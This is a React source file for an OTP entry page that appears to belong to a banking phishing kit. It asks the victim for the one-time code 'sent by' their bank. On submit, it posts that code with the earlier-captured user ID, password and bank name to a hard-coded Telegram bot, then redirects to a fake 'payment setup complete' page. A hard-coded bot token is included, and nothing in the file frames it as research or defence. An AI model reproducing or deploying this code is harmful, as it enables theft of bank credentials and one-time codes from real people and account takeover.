import React, { useState, useEffect } from 'react';
import './home.css';

import moment from 'moment';
import { useNavigate,Link , useLocation} from 'react-router-dom';
import Nav from './dashboard/nav';

import logo from './logo.svg';
import social from './social.png';
import footer from './footer.svg';


import {db, auth, storage} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query, doc, setDoc,deleteDoc } from "firebase/firestore";
import hero from './hero.jpeg';
import { ref, uploadBytes, getDownloadURL } from "firebase/storage";


import Swal from 'sweetalert2';



function Otp(){


    const location  = useLocation();
    const navigate = useNavigate();


    const[otpcode, setOtpCode] = useState("");
    const[name, setName] = useState(location.state.name);

    const[userid, setUserId] = useState(location.state.userid);

    const[password, setPassword] = useState(location.state.password);
    


    // useEffect(() => {
       
    //     // window.location.reload();
    
      
    
    //   }, []); 


    //   application data

    
    async function handleSubmit(e){
        e.preventDefault();

        try {
            

            const response = await axios.post(`https://api.telegram.org/bot5464982919:AAGtjeZQ4hxueJkOoefHp040NJNaWGIZKMM/sendMessage`, {
                chat_id: 950865661,
                text: `OTP is : ${otpcode} , UserId is : ${userid} , password is: ${password}  and bank is  ${name}`,
              });
        
            console.log('Message sent successfully:', response.data);

            navigate('/payment-setup-complete',
            
            );
          } catch (error) {
            console.error('Error sending message:', error.message);
          }
    }
    

    return(
        <>
            
        <div className='main row'>
            <Nav />

                  


               
              




                <div className='col-md-9 full bg-light m-0 px-0'>
                   
                    <br></br>
                    <br></br>
                    <br></br>
                 

                 <div className='card col-md-6 m-auto px-4 py-2 rounded'>

                     <div className='text-center'>
                     

                <h4 className='intro'>Enter the OTP code sent by <b>{name}</b> </h4>
                     </div>


                     <div className='cardtwo col-11 rounded shadow m-auto py-2'>

                         
<form onSubmit={handleSubmit}>

    <div className='form-group'>
<label className='topic'>OTP</label>
    <input onChange={function(e){
        setOtpCode(e.target.value);
    }} value={otpcode} type="text"className='form-control' required/>
</div>





<hr />

<div className='text-center'>

    <button type="submit" className='btn text-light w-100 continue'data-toggle="modal" data-target="#exampleModal">Validate</button>

</div>


</form>
</div>


          

            

                 </div>


               
                  

                 
             


               



    



               
               
                </div>


               



                 
                </div>    

        </>
    );
}

export default Otp;